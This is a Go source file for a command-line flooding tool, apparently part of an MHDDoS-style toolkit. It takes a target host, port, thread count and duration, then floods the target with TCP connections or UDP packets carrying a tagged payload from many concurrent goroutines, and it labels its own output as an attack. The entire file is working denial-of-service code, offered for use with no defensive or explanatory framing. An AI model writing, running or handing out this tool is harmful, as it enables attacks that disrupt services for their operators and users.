package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

func main() {
	target := flag.String("target", "", "Target host (e.g. 1.1.1.1)")
	port := flag.Int("port", 80, "Target port")
	threads := flag.Int("threads", 100, "Number of concurrent goroutines")
	duration := flag.Int("duration", 60, "Duration in seconds")
	method := flag.String("method", "tcp", "Attack method (tcp, udp)")

	flag.Parse()

	if *target == "" {
		flag.Usage()
		os.Exit(1)
	}

	fmt.Printf("[*] Go Core: Starting %s flood on %s:%d with %d threads for %ds\n", *method, *target, *port, *threads, *duration)

	var wg sync.WaitGroup
	deadline := time.Now().Add(time.Duration(*duration) * time.Second)

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				if *method == "tcp" {
					conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", *target, *port), 2*time.Second)
					if err == nil {
						conn.Close()
					}
				} else if *method == "udp" {
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", *target, *port))
					if err == nil {
						conn.Write([]byte("MHDDoS-GO-PAYLOAD"))
						conn.Close()
					}
				}
				// Optional: time.Sleep(time.Millisecond) // Tune for local testing
			}
		}(i)
	}

	wg.Wait()
	fmt.Println("[*] Go Core: Attack finished.")
}
